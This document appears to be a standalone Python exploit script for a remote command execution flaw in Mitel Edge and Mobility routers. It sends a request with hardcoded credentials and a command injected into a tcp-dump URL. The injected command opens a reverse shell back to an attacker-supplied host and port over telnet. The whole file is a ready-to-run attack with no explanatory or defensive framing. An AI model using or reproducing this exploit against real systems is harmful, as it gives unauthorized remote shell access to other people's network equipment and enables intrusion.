# Mitel RCE - Edge and Mobility Routers
# Start a netcat listener on port 23

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# Disable SSL verification warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#Vulnerable System
rhost = sys.argv[1]
#Telnet Listener / Netcat Listener for shell
lhost = sys.argv[2]
lport = sys.argv[3]
url = ('https://{rhost}/scripts/stream/tcp-dump?|rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|telnet%20{lhost}%20{lport}%20>/tmp/f'.format(rhost=rhost,lhost=lhost,lport=lport))
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Authorization": "Basic YWRtaW46Y3liaXJwb2M=",
    "Upgrade-Insecure-Requests": "1",
    "Connection": "close",
    "Content-Length": "0"
}
try:
    response = requests.get(url, headers=headers, verify=False)
except requests.exceptions.RequestException as e:
    print(e)
